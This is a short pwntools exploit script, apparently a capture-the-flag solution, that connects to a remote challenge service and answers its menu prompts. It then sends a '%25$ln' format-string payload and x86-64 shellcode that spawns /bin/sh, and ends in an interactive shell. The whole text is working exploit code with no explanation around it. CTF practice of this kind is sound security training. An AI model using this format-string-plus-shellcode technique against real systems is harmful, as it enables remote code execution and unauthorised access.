from pwn import *
import time
elf = ELF("./chall")
libc=elf.libc
context.binary=elf
target=remote('220.249.52.134',44114)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

sla("be:\n","A\x00")
sla("up?:\n","east\x00")
sla("e(0)?:",str(1))
sla("address'\n",str(0))
fs="%25$ln\x00"
sla("is:\n",fs)
shellcode="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
sa("SPELL\n",shellcode)
target.interactive()
